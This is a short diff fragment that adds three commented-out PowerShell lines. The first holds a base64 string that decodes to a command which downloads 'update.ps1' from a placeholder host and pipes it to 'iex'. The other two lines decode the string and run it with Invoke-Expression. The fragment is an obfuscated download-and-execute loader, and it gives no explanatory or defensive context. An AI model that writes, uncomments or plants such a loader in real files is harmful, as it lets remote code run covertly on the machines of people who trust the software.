@@ -1,0 +1,3 @@
+# $wire = "aXJtIC1VcmkgImh0dHBzOi8vZG93bmxvYWRzLmV4YW1wbGUuaW52YWxpZC91cGRhdGUucHMxIiAtVXNlckFnZW50ICJBYkNkRWZHaElqS2xNbk9wUXJTdFV2V3hZekFiQ2RFZkdoSWpLbE1uT3BRclN0VXZXeFl6QWJDZEVmR2hJaktsTW5PcFFyU3RVdld4WXpBYkNkRWZHaElqS2xNbk9wUXJTdFV2V3hZeiIgfCBpZXg="
+# $source = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wire))
+# Invoke-Expression $source
